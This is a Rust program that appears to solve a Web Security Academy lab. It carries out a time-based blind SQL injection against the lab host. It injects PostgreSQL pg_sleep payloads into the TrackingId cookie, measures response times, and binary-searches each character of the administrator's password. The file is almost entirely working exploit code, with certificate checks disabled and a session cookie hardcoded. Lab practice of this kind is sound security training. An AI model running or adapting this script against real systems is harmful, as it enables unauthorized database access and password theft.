use std::time::Instant;
mod level;
mod macros;

use crate::level::Level;

async fn check(
    client: &reqwest::Client,
    payload: &str,
    debug: bool,
) -> Result<bool, reqwest::Error> {
    let start = Instant::now();
    client
        .get("https://0a46001904988b56800230d60004006f.web-security-academy.net/filter?category=Accessories")
        .header("Cookie", format!("TrackingId=VkYJGSA0R1NAzLo7{}; session=eje1hgqF5Qeco28Sc9Vamn8ocPwkdPcl", payload))
        .send().await?;
    let duration = start.elapsed().as_millis();
    let success = duration > 700;
    dbg_print!(
        debug,
        "{}ms  ==>  {}  ==>  payload: \"{}\"",
        duration,
        u8::from(success),
        payload
    );
    Ok(success)
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // // test single run
    // println!("result: {}", Level::test(218, 255, true));

    // // test batch
    // let mut failed: u8 = 0;
    // for needle in 0..255 {
    //     let result = Level::test(needle, 255, false);
    //     if result != needle {
    //         failed += 1;
    //         println!("needle: {}, result: {}", needle, result)
    //     }
    // }
    // println!("{} failed.", failed);

    let verbose = true;

    // let proxy = reqwest::Proxy::https("http://127.0.0.1:8080")?;
    let client = reqwest::Client::builder()
        // .proxy(proxy)
        .danger_accept_invalid_certs(true)
        .build()?;

    assert_eq!(check(&client, "", true).await?, false);
    assert_eq!(
        check(&client, "'||(SELECT pg_sleep(0.7))||'", true).await?,
        true
    );
    // assert_eq!(check(&client, "'||concat('',1/0)||'", false).await?, false);

    let query = "select password from users where username='administrator'";

    println!("getting length...");
    let length = {
        let mut level = Level::new(255);
        loop {
            let result = check(
                &client,
                &format!(
                    "'||(select case when length(({})){}{} then pg_sleep(0.5) else '' end)||'",
                    query,
                    if level.more { ">" } else { "<" },
                    level.result
                )
                .replace(" ", "+")[..],
                verbose,
            )
            .await?;
            if level.completed(result, false) {
                break;
            }
        }
        level.result
    };
    println!("length: {}", length);

    println!("getting text...");
    let mut text = String::new();
    for index in 1..=length {
        let letter = char::from({
            let mut level = Level::new(255);
            loop {
                let result = check(
                    &client,
                    &format!(
                        "'||(select case when ascii(substr(({}),{},1)){}{} then pg_sleep(0.7) else '' end)||'",
                        query,
                        index,
                        if level.more { ">" } else { "<" },
                        level.result
                    )
                    .replace(" ", "+")[..],
                    verbose,
                )
                .await?;
                if level.completed(result, false) {
                    break;
                }
            }
            level.result
        });
        println!("{}", letter);
        text.push(letter);
    }
    println!("{}", text);

    Ok(())
}
